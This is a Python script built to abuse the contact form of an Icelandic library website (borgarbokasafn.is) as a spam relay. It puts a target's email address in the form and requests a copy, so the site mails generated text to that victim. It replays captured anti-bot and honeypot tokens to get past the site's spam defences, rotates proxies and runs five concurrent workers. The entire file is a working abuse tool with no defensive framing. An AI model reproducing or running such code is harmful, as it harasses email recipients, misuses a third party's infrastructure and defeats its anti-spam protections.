from os.path import basename

import requests

from module import Spam

cookies = {
    'Drupal.visitor.name': 'test%20https%3A%2F%2Fborgarbokasafn.is%2Fen%2Fcontact',
    'Drupal.visitor.mail': 'wezxasqw%40gmail.com',
}

headers = {
    'authority': 'borgarbokasafn.is',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    # Requests sorts cookies= alphabetically
    # 'cookie': 'Drupal.visitor.name=test%20https%3A%2F%2Fborgarbokasafn.is%2Fen%2Fcontact; Drupal.visitor.mail=wezxasqw%40gmail.com',
    'origin': 'https://borgarbokasafn.is',
    'referer': 'https://borgarbokasafn.is/en/contact',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}

s = 'Your message has been sent.'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        text = self.get_text()
        data = {
            'name': text,
            'mail': target,
            'subject': text,
            'cid': '19',
            'message': text,
            'copy': '1',
            'form_build_id': 'form-l18OFOZVvcCCWtVKIuT1j17pjADXjFU8rGv07TiUu5Y',
            'form_id': 'contact_site_form',
            'antibot_key': 'fb08aa10ad9aa357a19609536b88becd',
            'honeypot_time': '1677068587|PmUmo1qUT-ksc7rowd5Vk4BTtswK0jPMl_U1bpyF0_c',
            'op': 'Send message',
            'website-url': '',
        }

        response = requests.post('https://borgarbokasafn.is/en/contact', cookies=cookies, headers=headers, data=data,
                                 proxies=self.get_proxies())
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently(5)


if __name__ == '__main__':
    main()
